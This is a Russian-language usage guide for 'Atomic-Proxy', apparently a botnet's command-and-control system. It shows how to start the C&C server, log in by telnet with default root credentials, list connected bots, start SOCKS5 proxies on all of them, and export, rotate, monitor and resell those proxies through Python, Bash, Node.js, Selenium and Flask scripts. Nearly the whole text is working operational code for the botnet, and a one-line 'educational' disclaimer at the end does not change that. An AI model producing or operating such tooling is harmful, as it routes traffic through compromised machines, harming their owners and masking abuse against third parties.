# Примеры использования Atomic-Proxy

## Содержание

1. [Основные сценарии](#основные-сценарии)
2. [Примеры API](#примеры-api)
3. [Примеры использования прокси](#примеры-использования-прокси)
4. [Скрипты автоматизации](#скрипты-автоматизации)
5. [Интеграция в приложения](#интеграция-в-приложения)

---

## Основные сценарии

### Сценарий 1: Быстрый старт

```bash
# 1. Запуск C&C сервера
./atomic-cnc

# 2. Подключение к админке
telnet localhost 666
# Login: root / root@123

# 3. Проверка подключенных ботов
> bots

# 4. Запуск прокси на всех ботах
> proxy start port=1080

# 5. Получение списка прокси
> proxy list

# 6. Тест прокси
curl -x socks5://192.168.1.100:1080 https://api.ipify.org
```

### Сценарий 2: Управление через API

```bash
# Получить список прокси
curl "http://localhost:81/proxies?user=root&password=root@123" | jq .

# Запустить прокси
curl "http://localhost:81/proxy/start?user=root&password=root@123&port=1080"

# Получить статистику
curl "http://localhost:81/proxy/stats?user=root&password=root@123" | jq .

# Экспортировать список
curl "http://localhost:81/proxy/list?user=root&password=root@123&format=ip:port" > proxies.txt
```

### Сценарий 3: Мониторинг и статистика

```bash
# В админке
> proxy stats

# Через API с интервалом
watch -n 5 'curl -s "http://localhost:81/proxy/stats?user=root&password=root@123" | jq .'

# Проверка конкретного прокси
curl -x socks5://192.168.1.100:1080 -w "\nTime: %{time_total}s\n" https://api.ipify.org
```

---

## Примеры API

### Python - Получение списка прокси

```python
#!/usr/bin/env python3
import requests
import json

API_URL = "http://localhost:81"
USER = "root"
PASSWORD = "root@123"

def get_proxies():
    url = f"{API_URL}/proxies"
    params = {"user": USER, "password": PASSWORD}
    
    response = requests.get(url, params=params)
    data = response.json()
    
    if data["success"]:
        print(f"Total proxies: {data['count']}")
        for proxy in data["proxies"]:
            print(f"{proxy['ip']}:{proxy['port']} - {proxy['status']} - Conns: {proxy['connections_active']}")
    else:
        print(f"Error: {data.get('error')}")

if __name__ == "__main__":
    get_proxies()
```

### Python - Запуск прокси

```python
#!/usr/bin/env python3
import requests

API_URL = "http://localhost:81"
USER = "root"
PASSWORD = "root@123"

def start_proxies(port=1080, auth=False, max_conns=50):
    url = f"{API_URL}/proxy/start"
    params = {
        "user": USER,
        "password": PASSWORD,
        "port": port,
        "auth": str(auth).lower(),
        "max_connections": max_conns
    }
    
    response = requests.get(url, params=params)
    data = response.json()
    
    if data["success"]:
        print(f"Started: {data['started']}, Failed: {data['failed']}")
    else:
        print(f"Error: {data.get('error')}")

if __name__ == "__main__":
    start_proxies(port=1080, auth=False, max_conns=50)
```

### Python - Получение статистики

```python
#!/usr/bin/env python3
import requests
from datetime import datetime

API_URL = "http://localhost:81"
USER = "root"
PASSWORD = "root@123"

def get_stats():
    url = f"{API_URL}/proxy/stats"
    params = {"user": USER, "password": PASSWORD}
    
    response = requests.get(url, params=params)
    data = response.json()
    
    if data["success"]:
        print(f"\n{'='*50}")
        print(f"Proxy Network Statistics - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*50}")
        print(f"Total Proxies:       {data['total_proxies']}")
        print(f"Online Proxies:      {data['online_proxies']}")
        print(f"Active Connections:  {data['total_connections']}")
        print(f"Bytes Sent:          {data['total_bytes_sent'] / (1024*1024):.2f} MB")
        print(f"Bytes Received:      {data['total_bytes_recv'] / (1024*1024):.2f} MB")
        print(f"{'='*50}\n")

if __name__ == "__main__":
    get_stats()
```

### Bash - Экспорт и тест прокси

```bash
#!/bin/bash

API_URL="http://localhost:81"
USER="root"
PASS="root@123"

# Экспорт списка
echo "Exporting proxy list..."
curl -s "${API_URL}/proxy/list?user=${USER}&password=${PASS}&format=ip:port" > proxies.txt

# Подсчет прокси
COUNT=$(wc -l < proxies.txt)
echo "Exported ${COUNT} proxies"

# Тест каждого прокси
echo "Testing proxies..."
while IFS= read -r proxy; do
    echo -n "Testing ${proxy}... "
    
    if timeout 5 curl -x "socks5://${proxy}" -s https://api.ipify.org > /dev/null 2>&1; then
        echo "OK"
    else
        echo "FAIL"
    fi
done < proxies.txt
```

### Node.js - API клиент

```javascript
const axios = require('axios');

const API_URL = 'http://localhost:81';
const USER = 'root';
const PASSWORD = 'root@123';

class ProxyAPI {
    constructor(url, user, password) {
        this.url = url;
        this.auth = { user, password };
    }

    async getProxies() {
        const response = await axios.get(`${this.url}/proxies`, {
            params: this.auth
        });
        return response.data;
    }

    async startProxies(port = 1080, auth = false, maxConns = 50) {
        const response = await axios.get(`${this.url}/proxy/start`, {
            params: {
                ...this.auth,
                port,
                auth: auth.toString(),
                max_connections: maxConns
            }
        });
        return response.data;
    }

    async stopProxies() {
        const response = await axios.get(`${this.url}/proxy/stop`, {
            params: this.auth
        });
        return response.data;
    }

    async getStats() {
        const response = await axios.get(`${this.url}/proxy/stats`, {
            params: this.auth
        });
        return response.data;
    }
}

// Использование
(async () => {
    const api = new ProxyAPI(API_URL, USER, PASSWORD);

    // Получить список прокси
    const proxies = await api.getProxies();
    console.log(`Total proxies: ${proxies.count}`);

    // Получить статистику
    const stats = await api.getStats();
    console.log('Stats:', stats);
})();
```

---

## Примеры использования прокси

### Python - Запросы через прокси

```python
#!/usr/bin/env python3
import requests

PROXIES = {
    'http': 'socks5://192.168.1.100:1080',
    'https': 'socks5://192.168.1.100:1080'
}

def test_proxy():
    # Проверка IP
    response = requests.get('https://api.ipify.org', proxies=PROXIES)
    print(f"Your IP through proxy: {response.text}")
    
    # Проверка геолокации
    response = requests.get('https://ipapi.co/json/', proxies=PROXIES)
    data = response.json()
    print(f"Location: {data['city']}, {data['country_name']}")
    
    # HTTP запрос
    response = requests.get('https://httpbin.org/ip', proxies=PROXIES)
    print(f"HTTP test: {response.json()}")

if __name__ == "__main__":
    test_proxy()
```

### Python - Ротация прокси

```python
#!/usr/bin/env python3
import requests
import random
from itertools import cycle

def load_proxies(filename='proxies.txt'):
    with open(filename) as f:
        return [line.strip() for line in f if line.strip()]

def make_request(url, proxy):
    proxies = {
        'http': f'socks5://{proxy}',
        'https': f'socks5://{proxy}'
    }
    try:
        response = requests.get(url, proxies=proxies, timeout=10)
        return response
    except Exception as e:
        print(f"Error with proxy {proxy}: {e}")
        return None

# Циклическая ротация
def cycle_proxies():
    proxies = load_proxies()
    proxy_pool = cycle(proxies)
    
    for i in range(10):
        proxy = next(proxy_pool)
        print(f"Request {i+1} via {proxy}")
        response = make_request('https://api.ipify.org', proxy)
        if response:
            print(f"  IP: {response.text}")

# Случайная ротация
def random_proxies():
    proxies = load_proxies()
    
    for i in range(10):
        proxy = random.choice(proxies)
        print(f"Request {i+1} via {proxy}")
        response = make_request('https://api.ipify.org', proxy)
        if response:
            print(f"  IP: {response.text}")

if __name__ == "__main__":
    print("=== Cycle Rotation ===")
    cycle_proxies()
    
    print("\n=== Random Rotation ===")
    random_proxies()
```

### Python - Асинхронные запросы

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector

async def fetch(session, url, proxy):
    try:
        async with session.get(url, timeout=10) as response:
            text = await response.text()
            return proxy, text
    except Exception as e:
        return proxy, f"Error: {e}"

async def main():
    proxies = [
        'socks5://192.168.1.100:1080',
        'socks5://192.168.1.101:1080',
        'socks5://192.168.1.102:1080',
    ]
    
    tasks = []
    for proxy in proxies:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            task = fetch(session, 'https://api.ipify.org', proxy)
            tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    
    for proxy, result in results:
        print(f"{proxy}: {result}")

if __name__ == "__main__":
    asyncio.run(main())
```

### Selenium - Браузер через прокси

```python
#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.firefox.options import Options

def create_driver_with_proxy(proxy):
    options = Options()
    options.set_preference('network.proxy.type', 1)
    options.set_preference('network.proxy.socks', proxy.split(':')[0])
    options.set_preference('network.proxy.socks_port', int(proxy.split(':')[1]))
    options.set_preference('network.proxy.socks_version', 5)
    
    driver = webdriver.Firefox(options=options)
    return driver

def test_proxy_browser():
    proxy = '192.168.1.100:1080'
    driver = create_driver_with_proxy(proxy)
    
    try:
        driver.get('https://api.ipify.org')
        ip = driver.find_element('tag name', 'body').text
        print(f"IP через прокси: {ip}")
    finally:
        driver.quit()

if __name__ == "__main__":
    test_proxy_browser()
```

---

## Скрипты автоматизации

### Автоматический мониторинг

```bash
#!/bin/bash
# monitor.sh - Мониторинг прокси сети

API_URL="http://localhost:81"
USER="root"
PASS="root@123"
LOG_FILE="monitor.log"

while true; do
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Получить статистику
    STATS=$(curl -s "${API_URL}/proxy/stats?user=${USER}&password=${PASS}")
    
    ONLINE=$(echo $STATS | jq -r '.online_proxies')
    TOTAL=$(echo $STATS | jq -r '.total_proxies')
    CONNS=$(echo $STATS | jq -r '.total_connections')
    
    echo "[${TIMESTAMP}] Online: ${ONLINE}/${TOTAL}, Connections: ${CONNS}" | tee -a $LOG_FILE
    
    # Проверка порога
    if [ "$ONLINE" -lt 10 ]; then
        echo "WARNING: Low proxy count!" | tee -a $LOG_FILE
        # Отправить уведомление
        # curl -X POST https://api.telegram.org/bot<TOKEN>/sendMessage ...
    fi
    
    sleep 60
done
```

### Автоматический перезапуск

```bash
#!/bin/bash
# restart_proxies.sh - Перезапуск прокси при проблемах

API_URL="http://localhost:81"
USER="root"
PASS="root@123"

# Проверить статус
STATS=$(curl -s "${API_URL}/proxy/stats?user=${USER}&password=${PASS}")
ONLINE=$(echo $STATS | jq -r '.online_proxies')

if [ "$ONLINE" -lt 5 ]; then
    echo "Too few proxies online. Restarting..."
    
    # Остановить
    curl -s "${API_URL}/proxy/stop?user=${USER}&password=${PASS}"
    sleep 5
    
    # Запустить
    curl -s "${API_URL}/proxy/start?user=${USER}&password=${PASS}&port=1080"
    
    echo "Proxies restarted"
fi
```

### Экспорт для разных форматов

```python
#!/usr/bin/env python3
# export_proxies.py - Экспорт прокси в разных форматах

import requests
import json

API_URL = "http://localhost:81"
USER = "root"
PASSWORD = "root@123"

def export_txt(proxies, filename='proxies.txt'):
    with open(filename, 'w') as f:
        for p in proxies:
            f.write(f"{p['ip']}:{p['port']}\n")
    print(f"Exported to {filename}")

def export_json(proxies, filename='proxies.json'):
    with open(filename, 'w') as f:
        json.dump(proxies, f, indent=2)
    print(f"Exported to {filename}")

def export_csv(proxies, filename='proxies.csv'):
    with open(filename, 'w') as f:
        f.write("IP,Port,Country,Status,Connections\n")
        for p in proxies:
            f.write(f"{p['ip']},{p['port']},{p['country']},{p['status']},{p['connections_active']}\n")
    print(f"Exported to {filename}")

def main():
    url = f"{API_URL}/proxies"
    params = {"user": USER, "password": PASSWORD}
    
    response = requests.get(url, params=params)
    data = response.json()
    
    if data["success"]:
        proxies = data["proxies"]
        
        export_txt(proxies)
        export_json(proxies, 'proxies.json')
        export_csv(proxies, 'proxies.csv')
        
        print(f"\nTotal exported: {len(proxies)} proxies")
    else:
        print(f"Error: {data.get('error')}")

if __name__ == "__main__":
    main()
```

---

## Интеграция в приложения

### Flask веб-сервис

```python
#!/usr/bin/env python3
from flask import Flask, jsonify, request
import requests
import random

app = Flask(__name__)

PROXY_API = "http://localhost:81"
API_USER = "root"
API_PASS = "root@123"

def get_proxy_list():
    url = f"{PROXY_API}/proxies"
    params = {"user": API_USER, "password": API_PASS}
    response = requests.get(url, params=params)
    data = response.json()
    return data.get('proxies', [])

@app.route('/api/proxy/random', methods=['GET'])
def random_proxy():
    proxies = get_proxy_list()
    if proxies:
        proxy = random.choice(proxies)
        return jsonify({
            "success": True,
            "proxy": f"{proxy['ip']}:{proxy['port']}"
        })
    return jsonify({"success": False, "error": "No proxies available"})

@app.route('/api/proxy/list', methods=['GET'])
def list_proxies():
    proxies = get_proxy_list()
    return jsonify({
        "success": True,
        "count": len(proxies),
        "proxies": [f"{p['ip']}:{p['port']}" for p in proxies]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

### Docker контейнер

```dockerfile
# Dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install -r requirements.txt

COPY proxy_client.py .

CMD ["python", "proxy_client.py"]
```

```yaml
# docker-compose.yml
version: '3'
services:
  proxy-client:
    build: .
    environment:
      - PROXY_API=http://atomic-cnc:81
      - API_USER=root
      - API_PASS=root@123
    depends_on:
      - atomic-cnc
```

---

**Примечание**: Все примеры предназначены для образовательных целей. Используйте ответственно и только на системах, которыми вы владеете или имеете разрешение на использование.
